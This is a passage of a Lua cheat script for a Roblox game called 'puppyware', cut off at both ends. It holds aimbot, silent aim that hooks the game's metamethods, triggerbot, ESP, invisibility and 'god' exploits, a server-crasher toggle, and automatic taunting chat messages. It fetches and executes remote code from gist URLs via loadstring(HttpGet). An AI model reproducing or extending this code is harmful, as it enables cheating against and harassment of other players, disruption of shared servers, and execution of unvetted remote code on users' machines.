    TargetKey = "Q",
    Watermark = true
}


local PuppywareSettings = getgenv().PuppywareSettings

if PuppywareSettings == nil then

getgenv().PuppywareSettings = {
    PerformanceMode = true,
    turksense = false,
    TargetKey = "E",
    Watermark = true
}

end

local Script = {
Version = "v0.0.5",
Name = "puppyware-priv"
}

local Settings = {
Prediction_Settings = {
    AutoSettings = false,
    Prediction = 0.165
},
KillSay = {
    Type = "After Dead",
    OldPlayer = "",
    Cooldown = false,
    CustomMessage = false,
    CustomMessageText = "@s is tapped!",
    Message = {
        "@s is sus.",
        "nn tapped, @s bad cheat.",
        "puppyware on top, @s is clapped.",
        "@s is rekted.",
        "puppyware>you",
        "you are just bad get puppyware",
        "u rly thought",
        "bad boy clique",
        "noob",
        "xD",
        "why are you that bad son",
        "you shall quit"
    }
},
Aimbot = {
    Enabled = false,
    Aiming = false,
    FOV = {
        Enabled = false,
        Size = 100,
        Round = 100,
        Color = Color3.fromRGB(28, 56, 139),
        Shape = "Custom",
        Filled = false,
        Transparency = 0.5
    },
    Hitbox = "Head",
    Nearest = "Mouse",
    VisibleCheck = false,
    IgnoreFOV = false,
},
SilentAim = {
    Enabled = false,
    WallCheck = false,
    FOV = {
        Enabled = false,
        Size = 100,
        Round = 100,
        Color = Color3.fromRGB(28, 56, 139),
        Shape = "Custom",
        Filled = false,
        Transparency = 0.5
    },
    Hitbox = "Head",
    Nearest = "Mouse",
    Mode = "Normal",
    VisibleCheck = false,
    IgnoreFOV = false,
    LookAt = false,
},
Triggerbot = {
    Enabled = false,
    Delay = {
        Enabled = false,
        Value = 0
    }
},
AntiAim = {
    Enabled = false,
    Type = "Jitter",
    Angle = 20,
    Speed = 100,
    Underground = false,
    AntiPointAt = false,
    NoAutoRotate = false,
    AntiPointAtDistance = 20
},
Whitelist = {
    Players = {},
    Friends = {},
    Holder = "",
    Enabled = false,
    CrewEnabled = false,
    FriendsWhitelist = false
},
Movement = {
    CFrameSpeed = false,
    Type = "Render"
},
ServerCrash = {
    Enabled = false,
    Value = 0
},
God = {
    GodBullet = false,
    GodMelee = false,
    AntiRagdoll = false,
    IsStillAlive = false
},
Target = {
    Enabled = false,
    TargetUser = nil,
    WallCheck = false,
    Bind = PuppywareSettings.TargetKey
}
}

local Service = setmetatable({}, {
__index = function(t, k)
    return game:GetService(k)
end
})

local WS = workspace
local Insert = table.insert
local Remove = table.remove
local Find = table.find
local Players = Service.Players
local LocalPlayer = Players.LocalPlayer
local CurrentCamera = WS.CurrentCamera
local WorldToViewPortPoint = CurrentCamera.WorldToViewportPoint
local Mouse = LocalPlayer:GetMouse()
local RunService = Service.RunService
local GuiInset = Service.GuiService:GetGuiInset()
local ReplicatedStorage = Service.ReplicatedStorage
local UserInputService = Service.UserInputService
local KeyCode = Enum.KeyCode
local InputType = Enum.UserInputType
local Material = Enum.Material
local UniversalAnimation = Instance.new("Animation")
local StarterGui = Service.StarterGui

local Module = {
Instance = {},
Players = {},
DrawingInstance = {},
OldCFrame,
Ignores = {
    "UpperTorso",
    "LowerTorso",
    "Head",
    "LeftHand",
    "LeftUpperArm",
    "LeftLowerArm",
    "RightHand",
    "RightUpperArm",
    "RightLowerArm"
},
BodyParts = {
    "Head",
    "Torso",
    "HumanoidRootPart",
    "Left Arm",
    "Right Arm",
    "Left Leg",
    "Right Leg"
},	
Functions = {
    Network = function(Data)
        if Data and Data.Character and Data.Character:FindFirstChild("HumanoidRootPart") ~= nil and Data.Character:FindFirstChild("Humanoid") ~= nil and Data.Character:FindFirstChild("Head") ~= nil then
            return true
        end
        return false
    end,
    Cham = function(Data, State)
        local BoxVar = nil
        local GlowVar = nil
        if State then
            for _, v in pairs(Data.Character:GetChildren()) do
                if v:IsA("BasePart") and v.Transparency ~= 1 then
                    if not v:FindFirstChild("Box") then
                        BoxVar = Instance.new("BoxHandleAdornment", v)
                        BoxVar.Name = "Box"
                        BoxVar.AlwaysOnTop = true
                        BoxVar.ZIndex = 4
                        BoxVar.Adornee = v
                        BoxVar.Color3 = Color3.fromRGB(0, 153, 153)
                        BoxVar.Transparency = 0.5
                        BoxVar.Size = v.Size + Vector3.new(0.02, 0.02, 0.02)
                    end
                end
            end
        else
            for i, v in pairs(Data.Character:GetChildren()) do
                if v:IsA("BasePart") and v.Transparency ~= 1 then
                    if v:FindFirstChild("Box") then
                        v["Box"]:Destroy()
                    end
                end
            end
            
            return BoxVar, GlowVar
        end
    end
},
Drawing = {
    Circle = function(Thickness)
        local Circle = Drawing.new("Circle")
        Circle.Transparency = 1
        Circle.Thickness = Thickness
        return Circle
    end
},
}

Module.Functions.NoSpace = function(Data)
return Data:gsub("%s+", "") or Data
end

Module.Functions.Find = function(Data)
local Target = nil

for i, v in next, Players:GetPlayers() do
    if v.Name ~= LocalPlayer.Name and v.Name:lower():match('^'.. Module.Functions.NoSpace(Data):lower()) then
        Target = v.Name
    end
end

return Target
end

Module.Functions.PlayAnimation = function(Data, SpeedData, ActionData)
if Module.Functions.Network(LocalPlayer) then
    UniversalAnimation.AnimationId = "rbxassetid://" .. tostring(Data)
    local Track = LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation)
    if ActionData then
        Track.Priority = Enum.AnimationPriority.Action
    end
    if SpeedData ~= nil then
        Track:AdjustSpeed(SpeedData)
    end
    Track:Play()
end
end

Module.Functions.StopAnimation = function()
if Module.Functions.Network(LocalPlayer) then
    for _, v in next, LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
        if v.Animation.AnimationId:match("rbxassetid") then
            v:Stop()
        end
    end
end
end

Module.Functions.Underground = function(Data)
if Module.Functions.Network(LocalPlayer) then
    if Data then
        LocalPlayer.Character.Humanoid.HipHeight = -1
        Module.Functions.PlayAnimation(3152378852, nil, true)
    else
        LocalPlayer.Character.Humanoid.HipHeight = 2.1
        Module.Functions.StopAnimation()
    end
end
end

Module.Functions.AntiHead = function(State)
if Module.Functions.Network(LocalPlayer) then
    if State then
        Module.Functions.PlayAnimation(3189777795, 0.1, false)
    else
        Module.Functions.StopAnimation()
    end
end
end

Module.Functions.IsVisible = function(OriginPart, Part)
if Module.Functions.Network(LocalPlayer) then
    local IgnoreList = {CurrentCamera, LocalPlayer.Character, OriginPart.Parent}
    local Parts = CurrentCamera:GetPartsObscuringTarget(
        {
            OriginPart.Position, 
            Part.Position
        },
        IgnoreList
    )

    for i, v in pairs(Parts) do
        if v.Transparency >= 0.3 then
            Module.Instance[#Module.Instance + 1] = v
        end

        if v.Material == Enum.Material.Glass then
            Module.Instance[#Module.Instance + 1] = v
        end
    end

    return #Parts == 0
end
return true
end

Module.Functions.NilBody = function()
if Module.Functions.Network(LocalPlayer) then
    for i, v in pairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("BasePart") or v:IsA("Part") or v:IsA("MeshPart") then
            if v.Name ~= "HumanoidRootPart" then
                v:Destroy()
            end
        end
    end
end
end

Module.Functions.TableRemove = function(Data, Data2)
for i, v in pairs(Data) do
    if v == Data2 then
        Remove(Data, i)
    end
end
end

Module.Functions.GodFunc = function(Variable)
LocalPlayer.Character.RagdollConstraints:Destroy()
local Folder = Instance.new("Folder", LocalPlayer.Character)
Folder.Name = "FULLY_LOADED_CHAR"
wait()
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
Variable = false
end

Module.Functions.Init = function()
for _, v in next, Players:GetPlayers() do
    if v ~= LocalPlayer and v:IsFriendsWith(LocalPlayer.UserId) then
        Insert(Settings.Whitelist.Friends, v.Name)
    end
end

Players.PlayerAdded:Connect(function(_Player)
    if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
        Insert(Settings.Whitelist.Friends, _Player.Name)
    end
end)

Players.PlayerRemoving:Connect(function(_Player)
    if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
        Module.Functions.TableRemove(Settings.Whitelist.Friends, _Player.Name)
    end
end)

LocalPlayer.CharacterAdded:Connect(function()
    wait(0.5)
    Settings.God.IsStillAlive = false
    if LocalPlayer.Character:FindFirstChild("BodyEffects") then
        if Settings.God.GodBullet then
            Module.Functions.GodFunc(Settings.God.GodBullet)
            LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
        end
        if Settings.God.GodMelee then
            Module.Functions.GodFunc(Settings.God.GodMelee)
            Settings.God.IsStillAlive = true
            LocalPlayer.Character.BodyEffects.Armor:Destroy()
            LocalPlayer.Character.BodyEffects.Defense:Destroy()
        end
        if Settings.God.AntiRagdoll then
            Module.Functions.GodFunc(Settings.God.AntiRagdoll)
        end
    end
    wait(0.5)
    if Settings.AntiAim.Underground then
        Module.Functions.Underground(true)
    end
    wait(0.4)
    if Settings.AntiAim.UndergroundWallbang then
        Float = Instance.new("BodyVelocity")
        Float.Parent = LocalPlayer.Character.HumanoidRootPart
        Float.MaxForce = Vector3.new(100000, 100000, 100000)
        Float.Velocity = Vector3.new(0, 0, 0)
        wait(0.25)
        LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -11.5, 0)
        Module.Functions.Cham(LocalPlayer, true)
        Settings.AntiAim.UndergroundWallbang = true
    end
end)
end

Module.Functions.NearestMouse = function()
local Target = nil
local Distance = math.huge

for _, v in next, Players:GetPlayers() do
    if Module.Functions.Network(v) and v ~= LocalPlayer then
        local RootPosition, RootVisible = WorldToViewPortPoint(CurrentCamera, v.Character.HumanoidRootPart.Position)
        local NearestToMouse = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(RootPosition.X, RootPosition.Y)).magnitude
        if RootVisible and Distance > NearestToMouse then
            if (not Settings.Whitelist.FriendsWhitelist or not Find(Settings.Whitelist.Friends, v.Name)) and (not Settings.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not Settings.Whitelist.Enabled or not Find(Settings.Whitelist.Players, v.Name)) then
                Target = v
                Distance = NearestToMouse
            end
        end
    end
end

return Target, Distance
end

Module.Functions.NearestRoot = function()
local Target = nil
local Distance = math.huge

for _, v in next, Players:GetPlayers() do
    if Module.Functions.Network(v) and Module.Functions.Network(LocalPlayer) and v ~= LocalPlayer then
        local NearestToRoot = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude
        if Distance > NearestToRoot then
            if (not Settings.Whitelist.FriendsWhitelist or not Find(Settings.Whitelist.Friends, v.Name)) and (not Settings.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not Settings.Whitelist.Enabled or not Find(Settings.Whitelist.Players, v.Name)) then
                Target = v
                Distance = NearestToRoot
            end
        end
    end
end

return Target, Distance
end

Module.Functions.TargetCheck = function(Data)
if Data == "Mouse" then
    return Module.Functions.NearestMouse()
elseif Data == "Distance" then
    return Module.Functions.NearestRoot()
end
end

Module.Functions.Invisible = function()
if Module.Functions.Network(LocalPlayer) then
    Module.OldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
    wait(0.1)
    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 96995694596945934234234234, 0)
    wait(0.1)
    LocalPlayer.Character.LowerTorso.Root:Destroy()
    for _, v in pairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("MeshPart") and not table.find(Module.Ignores, v.Name) then
            v:Destroy()
        end
    end
    wait(0.1)
    LocalPlayer.Character.HumanoidRootPart.CFrame = Module.OldCFrame
end
end

Module.Functions.Jitter = function(Speed, Angle)
if Module.Functions.Network(LocalPlayer) then
    local Jit = Speed or math.random(30, 90)
    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) * CFrame.Angles(0, math.rad(Angle) + math.rad((math.random(1, 2) == 1 and Jit or -Jit)), 0) 
end
end

Module.Functions.Spin = function(Speed)
if Module.Functions.Network(LocalPlayer) then
    LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(Speed), 0)
end
end

Module.Functions.HttpGet = function(Data)
return loadstring(game:HttpGet(Data))()
end

local Library = Module.Functions.HttpGet("https://gist.githubusercontent.com/cyberical9B55/dc34c86462ced900e44be30aa30bfdab/raw/fb803999e1e7a5893ec313ebe7dde0e656e46b82/lira")
local NotifyLibrary = Module.Functions.HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua")
local Notify = NotifyLibrary.Notify
Module.Functions.Init()

Library.theme.topheight = 50
--Library.theme.accentcolor = Color3.fromRGB(255, 105, 180)
--Library.theme.accentcolor2 = Color3.fromRGB(128, 23, 90)
Library.theme.fontsize = 15
Library.theme.titlesize = 17

if PuppywareSettings.Watermark == true then

Library:CreateWatermark("Puppy-Ware | {fps} | {game}")

end

local Window = Library:CreateWindow(Script.Name, Vector2.new(492, 598), Enum.KeyCode.RightShift)
local LegitTab = Window:CreateTab("Legit")
local AimbotSection = LegitTab:CreateSector("Aimbot", "left")

local AimbotToggle = AimbotSection:AddToggle('Enabled', false, function(State)
Settings.Aimbot.Enabled = State
end)

AimbotSection:AddToggle('Visible Check', false, function(State)
Settings.Aimbot.VisibleCheck = State
end)

AimbotSection:AddDropdown('Hitbox', {"Head", "HumanoidRootPart"}, "Head", false, function(Option)
Settings.Aimbot.Hitbox = Option
end)

AimbotSection:AddDropdown('Nearest', {"Mouse", "Distance"}, "Mouse", false, function(Option)
Settings.Aimbot.Nearest = Option
end)

local AimbotFOVSection = LegitTab:CreateSector("FOV", "left")

AimbotFOVSection:AddToggle('Enabled', false, function(State)
Settings.Aimbot.FOV.Enabled = State
end)

AimbotFOVSection:AddToggle('Filled', false, function(State)
Settings.Aimbot.FOV.Filled = State
end)

AimbotFOVSection:AddDropdown('Shape', {"Custom", "Octagon", "Circle"}, "Custom", false, function(Option)
Settings.Aimbot.FOV.Shape = Option
end)

AimbotFOVSection:AddSlider("Size", 25, 100, 500, 1, function(Value)
Settings.Aimbot.FOV.Size = Value
end)

AimbotFOVSection:AddSlider("Round", 2.5, 100, 500, 1, function(Value)
Settings.Aimbot.FOV.Round = Value
end)

AimbotFOVSection:AddSlider("Transparency", 0, 5, 10, 1, function(Value)
Settings.Aimbot.FOV.Transparency = tonumber("0." .. Value)
end)

AimbotFOVSection:AddColorpicker("Color", Settings.Aimbot.FOV.Color, function(Color)
Settings.Aimbot.FOV.Color = Color
end)

local TriggerbotSection = LegitTab:CreateSector("Triggerbot", "right")

TriggerbotSection:AddToggle('Enabled', Settings.Triggerbot.Enabled, function(State)
Settings.Triggerbot.Enabled = State
end)
local RageTab = Window:CreateTab("Rage")
local SilentAimSection = RageTab:CreateSector("Silent Aim", "left")

local SilentToggle = SilentAimSection:AddToggle('Silent Aim', false, function(State)
Settings.SilentAim.Enabled = State
end)

SilentAimSection:AddToggle('Wallbang (Beta)', false, function(State)
Settings.SilentAim.WallBang = State
end)


SilentAimSection:AddToggle('Ping Based Prediction',false,function(State)
Settings.Prediction_Settings.AutoSettings = State
end)

SilentAimSection:AddToggle('Visible Check', false, function(State)
Settings.SilentAim.VisibleCheck = State
end)

SilentAimSection:AddToggle('Ignore FOV', false, function(State)
Settings.SilentAim.IgnoreFOV = State
end)

SilentAimSection:AddToggle('Look At', false, function(State)
Settings.SilentAim.LookAt = State
end)

SilentAimSection:AddDropdown('Modes', {"Normal", "Insane"}, "Insane", false, function(Option)
Settings.SilentAim.Mode = Option
end)

SilentAimSection:AddDropdown('Hitbox', {"Head", "HumanoidRootPart"}, "Head", false, function(Option)
Settings.SilentAim.Hitbox = Option
end)

SilentAimSection:AddDropdown('Nearest', {"Mouse", "Distance"}, "Mouse", false, function(Option)
Settings.SilentAim.Nearest = Option
end)

local FOVSection = RageTab:CreateSector("FOV", "left")

FOVSection:AddToggle('Enabled', false, function(State)
Settings.SilentAim.FOV.Enabled = State
end)

FOVSection:AddToggle('Filled', false, function(State)
Settings.SilentAim.FOV.Filled = State
end)

FOVSection:AddDropdown('Shape', {"Custom", "Octagon", "Circle"}, "Custom", false, function(Option)
Settings.SilentAim.FOV.Shape = Option
end)

FOVSection:AddSlider("Size", 25, 100, 500, 1, function(Value)
Settings.SilentAim.FOV.Size = Value
end)

FOVSection:AddSlider("Round", 2.5, 100, 500, 1, function(Value)
Settings.SilentAim.FOV.Round = Value
end)

FOVSection:AddSlider("Transparency", 0, 5, 10, 1, function(Value)
Settings.SilentAim.FOV.Transparency = tonumber("0." .. Value)
end)

FOVSection:AddColorpicker("Color", Settings.SilentAim.FOV.Color, function(Color)
Settings.SilentAim.FOV.Color = Color
end)

local AntiAimSeciton = RageTab:CreateSector("Anti Aim", "right")

AntiAimSeciton:AddToggle('Enabled', false, function(State)
Settings.AntiAim.Enabled = State
end)

AntiAimSeciton:AddDropdown('Type', {"Spin", "Jitter"}, "Jitter", false, function(Option)
Settings.AntiAim.Type = Option
end)

AntiAimSeciton:AddSlider("Speed", 10, 50, 300, 1, function(Value)
Settings.AntiAim.Speed = Value
end)

AntiAimSeciton:AddSlider("Angle", 0, 180, 360, 1, function(Value)
Settings.AntiAim.Angle = Value
end)

AntiAimSeciton:AddToggle('Anti Point At', false, function(State)
Settings.AntiAim.AntiPointAt = State
end)

AntiAimSeciton:AddSlider("Anti Point At Distance", 2.5, 20, 100, 1, function(Value)
Settings.AntiAim.AntiPointAtDistance = Value
end)

AntiAimSeciton:AddToggle('Underground', false, function(State)
if State then
    Settings.AntiAim.Underground = true
    Module.Functions.Underground(true)
else
    Settings.AntiAim.Underground = false
    Module.Functions.Underground(false)
end
end)

local Undergroundwallbangtoggle = AntiAimSeciton:AddToggle('Underground Wallbang', Settings.AntiAim.UndergroundWallbang, function(State)
    pcall(function()
        if State then
			wait(0.5)
			Float = Instance.new("BodyVelocity")
			Float.Parent = LocalPlayer.Character.HumanoidRootPart
			Float.MaxForce = Vector3.new(100000, 100000, 100000)
			Float.Velocity = Vector3.new(0, 0, 0)
			wait(0.25)
			LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -11.5, 0)
			Module.Functions.Cham(LocalPlayer, true)
			Settings.AntiAim.UndergroundWallbang = true
		else
			LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 11.5, 0)
			Module.Functions.Cham(LocalPlayer, false)
			Float:Destroy()
			Settings.AntiAim.UndergroundWallbang = false
		end
    end)
end)

Undergroundwallbangtoggle:AddKeybind(Enum.KeyCode.X)

AntiAimSeciton:AddToggle('No Auto Rotate', false, function(State)
Settings.AntiAim.NoAutoRotate = State
end)

AntiAimSeciton:AddButton('Invisible', function(State)
Module.Functions.Invisible()
end)

AntiAimSeciton:AddButton('Nil Body', function(State)
Module.Functions.NilBody()
end)

local WhitelistSection = RageTab:CreateSector("Settings", "right")

WhitelistSection:AddTextbox("Player Username", nil, function(Text)
if Text ~= nil and Module.Functions.Find(Text) ~= nil and Players:FindFirstChild(Module.Functions.Find(Text)) then
    Settings.Whitelist.Holder = Module.Functions.Find(Text)
else
    Notify({
        Title = Script.Name,
        Description = "Player is not found.",
        Duration = 3
    })
end
end)

WhitelistSection:AddButton('Add Whitelist', function(State)
if Settings.Whitelist.Holder ~= nil and Players:FindFirstChild(Settings.Whitelist.Holder) then
    if Find(Settings.Whitelist.Players, Settings.Whitelist.Holder) then
        Notify({
            Title = Script.Name,
            Description = Settings.Whitelist.Holder .. " is whitelisted.",
            Duration = 3
        })
    else
        Insert(Settings.Whitelist.Players, Settings.Whitelist.Holder)
        Notify({
            Title = Script.Name,
            Description = "Whitelisted " .. Settings.Whitelist.Holder,
            Duration = 3
        })
    end
else
    Notify({
        Title = Script.Name,
        Description = "Player is not found.",
        Duration = 3
    })
end
end)

WhitelistSection:AddButton('Remove Whitelist', function()
if Settings.Whitelist.Holder ~= nil and Players:FindFirstChild(Settings.Whitelist.Holder) then
    if Find(Settings.Whitelist.Players, Settings.Whitelist.Holder) then
        Module.Functions.TableRemove(Settings.Whitelist.Players, Settings.Whitelist.Holder)
        Notify({
            Title = Script.Name,
            Description = "Removed " .. Settings.Whitelist.Holder,
            Duration = 5
        })
    else
        Notify({
            Title = Script.Name,
            Description = Settings.Whitelist.Holder .. " is not whitelisted.",
            Duration = 5
        })
    end
else
    Notify({
        Title = Script.Name,
        Description = "Player is not found.",
        Duration = 3
    })
end
end)

WhitelistSection:AddToggle('Whitelist Enabled', false, function(State)
Settings.Whitelist.Enabled = State
end)

WhitelistSection:AddToggle('Crew Whitelist', false, function(State)
Settings.Whitelist.CrewEnabled = State
end)

WhitelistSection:AddToggle('Friends Whitelist', false, function(State)
Settings.Whitelist.FriendsWhitelist = State
end)

local MiscTab = Window:CreateTab("Misc")
local ServerSection = MiscTab:CreateSector("Server Crasher", "left")

ServerSection:AddToggle('Enabled', false, function(State)
if State then
    Module.Functions.Invisible()
end
Settings.ServerCrash.Enabled = State
end)

local CrashPercent = ServerSection:AddLabel('Percent : 0%')

local KillSaySection = MiscTab:CreateSector("Kill Say", "right")

KillSaySection:AddDropdown('Method', {"After Dead", "Before Dead"}, "After Dead", false, function(Option)
Settings.KillSay.Type = Option
end)

KillSaySection:AddToggle('Enabled', false, function(State)
Settings.KillSay.Enabled = State
end)

KillSaySection:AddToggle('Custom Message', false, function(State)
Settings.KillSay.CustomMessage = State
end)

KillSaySection:AddTextbox("Custom Message Text", "@s is tapped!", function(Text)
Settings.KillSay.CustomMessageText = Text
end)

local MovementSection = MiscTab:CreateSector("Movement", "right")

MovementSection:AddDropdown('Method', {"Render", "Heartbeat"}, "Render", false, function(Option)
Settings.Movement.Type = Option
end)

MovementSection:AddToggle('CFrame Speed Enabled', false, function(State)
Settings.Movement.CFrameSpeed = State
end)

local GodSection = MiscTab:CreateSector("God", "left")

GodSection:AddButton('God Block', function(State)
pcall(function()
    LocalPlayer.Character.BodyEffects.Defense.CurrentTimeBlock:Destroy()
end)
end)

GodSection:AddButton('God Bullet', function(State)
Settings.God.GodBullet = State
Module.Functions.NilBody()
end)

GodSection:AddButton('God Melee', function(State)
Settings.God.GodMelee = State
Module.Functions.NilBody()
end)

GodSection:AddButton('Anti Ragdoll', function(State)
Settings.God.AntiRagdoll = State
Module.Functions.NilBody()
end)

local TargetTab = Window:CreateTab("Target")
local MainSection = TargetTab:CreateSector("Main", "left")

MainSection:AddToggle('Enabled', false, function(State)
Settings.Target.Enabled = State
end)

MainSection:AddToggle('Wall Check', false, function(State)
Settings.Target.WallCheck = State
end)

if not PuppywareSettings.PerformanceMode then
local ESPLibrary = Module.Functions.HttpGet("https://gist.githubusercontent.com/VaultGitos/5a937cdc7a753160232d86dcc3ce79a6/raw/99cce502c74b1574abfd8d79d36da3c8aa3be83d/ESP.lua")
local VisualsTab = Window:CreateTab("Visuals")
local ESPSection = VisualsTab:CreateSector("ESP", "left")

local BoxToggle = ESPSection:AddToggle('Boxes', false, function(State)
    ESPLibrary.Boxes = State
end)

BoxToggle:AddColorpicker(Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.BoxesColor = Color
end)

local NameToggle = ESPSection:AddToggle('Name', false, function(State)
    ESPLibrary.Names = State
end)

NameToggle:AddColorpicker(Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.NamesColor = Color
end)

local DistanceToggle = ESPSection:AddToggle('Distance', false, function(State)
    ESPLibrary.Distance = State
end)

DistanceToggle:AddColorpicker(Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.DistanceColor = Color
end)

local ChamToggle = ESPSection:AddToggle('Chams', false, function(State)
    ESPLibrary.Cham = State
end)

ESPSection:AddColorpicker("Cham Color 1", Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.ChamColor1 = Color
end)

ESPSection:AddColorpicker("Cham Color 2", Color3.fromRGB(255, 255, 255), function(Color)
    ESPLibrary.ChamColor2 = Color
end)
end

game:GetService("Workspace").Players.ChildRemoved:Connect(function(PlayerThatIsGone)
if PlayerThatIsGone.Name == Settings.KillSay.OldPlayer and Settings.KillSay.Type == "After Dead" then
    if Settings.KillSay.CustomMessage then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.CustomMessageText:gsub("@s", Settings.KillSay.OldPlayer), "All")
    else
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.Message[math.random(1, 4)]:gsub("@s", Settings.KillSay.OldPlayer), "All")
    end
end
end)

UserInputService.InputBegan:Connect(function(Key, Break)
if Key.UserInputType == InputType.MouseButton2 and not Break then
    Settings.Aimbot.Aiming = true
end
if Key.UserInputType == InputType.MouseButton1 and not Break then
    if Module.Functions.Network(LocalPlayer) then
        if LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo").Value ~= 0 then
            Settings.KillSay.OldPlayer = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name
            Settings.KillSay.Cooldown = true
            spawn(function()
                wait(1)
                Settings.KillSay.Cooldown = false
            end)
        end
    end
    if Settings.SilentAim.Enabled and Settings.SilentAim.WallBang and Module.Functions.Network(LocalPlayer) then
        if not Module.Functions.IsVisible(Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) and LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo").Value ~= 0 then
            if LocalPlayer.Character.RightHand:FindFirstChild("RightWrist") then
                LocalPlayer.Character.RightHand:FindFirstChild("RightWrist"):Destroy()
            end
            wait(0.1)
            LocalPlayer.Character.Humanoid:ChangeState(11)
            LocalPlayer.Character.RightHand.CFrame = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart.CFrame * CFrame.new(0, -1, 0)
        end
    end
end
if Key.KeyCode == Enum.KeyCode[Settings.Target.Bind] and not Break then
    if Settings.Target.Enabled then
        if Module.Functions.IsVisible(Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) then
            Settings.Target.TargetUser = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name
            Notify({
                Title = Script.Name .. " " .. Script.Version,
                Description = "Targetted " .. Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name .. " (" .. Module.Functions.TargetCheck(Settings.SilentAim.Nearest).DisplayName .. ")",
                Duration = 3
            })
        end
    end
end
end)

UserInputService.InputEnded:Connect(function(Key, Break)
if Key.UserInputType == InputType.MouseButton2 and not Break then
    Settings.Aimbot.Aiming = false
end
if Key.UserInputType == InputType.MouseButton1 and not Break then
    if Module.Functions.Network(LocalPlayer) then
        --[[
            local GRightWrist = Instance.new("Motor6D", LocalPlayer.Character.RightHand)
            GRightWrist.C0 = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
            GRightWrist.C1 = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
            GRightWrist.CurrentAngle = 0
            GRightWrist.Name = "RightWrist"
            GRightWrist.Part0 = LocalPlayer.Character.RightLowerArm
            GRightWrist.Part1 = LocalPlayer.Character.RightHand
        ]]
        wait(0.75)
        LocalPlayer.Character.RightHand.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 0)
    end
end
end)

local __Index;
__Index = hookmetamethod(game, "__index", function(t, k)
if t == Mouse and (tostring(k) == "Hit" or tostring(k) == "Target") then
    if Settings.Target.Enabled then
        if Settings.Target.TargetUser ~= nil then
            if Players:FindFirstChild(Settings.Target.TargetUser) ~= nil and Module.Functions.Network(Players[Settings.Target.TargetUser]) then
                if (not Settings.Target.WallCheck or Module.Functions.IsVisible(Players[Settings.Target.TargetUser].Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) then
                    local TargetBody
                    if Players[Settings.Target.TargetUser].Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall then
                        TargetBody = Players[Settings.Target.TargetUser].Character.LeftFoot
                    else
                        TargetBody = Players[Settings.Target.TargetUser].Character[Settings.SilentAim.Hitbox]
                    end
                    local Prediction = TargetBody.CFrame + (TargetBody.Velocity * Settings.Prediction_Settings.Prediction)

                    return (tostring(k) == "Hit" and Prediction or tostring(k) == "Target" and TargetBody)
                end
            end
        end
    else
        if Settings.SilentAim.Enabled then
            local NearestTarget, NearestPos = Module.Functions.TargetCheck(Settings.SilentAim.Nearest)
            if NearestTarget and (not Settings.SilentAim.VisibleCheck or Module.Functions.IsVisible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.SilentAim.FOV.Enabled or Settings.SilentAim.FOV.Size > NearestPos) then
                local TargetBody
                if NearestTarget.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and Settings.SilentAim.Mode == "Insane" then
                    TargetBody = NearestTarget.Character.LeftFoot
                else
                    TargetBody = NearestTarget.Character[Settings.SilentAim.Hitbox]
                end

